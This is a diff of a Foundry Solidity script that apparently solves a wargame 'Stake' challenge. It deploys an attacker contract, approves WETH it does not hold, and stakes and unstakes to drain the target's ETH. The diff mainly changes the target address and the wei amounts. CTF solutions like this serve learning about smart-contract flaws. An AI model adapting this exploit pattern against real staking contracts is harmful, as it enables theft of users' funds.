@@ -18,23 +18,23 @@ contract AttackerContract {
 }
 
 contract StakeSolution is Script {
-    Stake public stakeInstance = Stake(0x923C6290A62b9642a7fF3B5f6EC7f49d011B92DF);
+    Stake public stakeInstance = Stake(0xda02499Ac1fDAF7a418eB5867a51ef725366CE18);
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
         console.log("Player : ", vm.envAddress("MY_ADDRESS"));
 
-        uint256 amount = 0.0011 ether + 0.0001 ether; // 0.0012
+        uint256 amount = 0.0011 ether + 1;
 
         AttackerContract attackerContract = new AttackerContract(address(stakeInstance));
 
-        attackerContract.StakeETH{ value: amount }();
+        attackerContract.StakeETH{ value: amount + 1 }();
 
         address(stakeInstance.WETH()).call(abi.encodeWithSignature("approve(address,uint256)", address(stakeInstance), type(uint256).max));
         
-        stakeInstance.StakeWETH(amount - 0.0001 ether);
-        stakeInstance.Unstake(amount - 0.0001 ether);
+        stakeInstance.StakeWETH(amount);
+        stakeInstance.Unstake(amount);
 
         vm.stopBroadcast();
     }
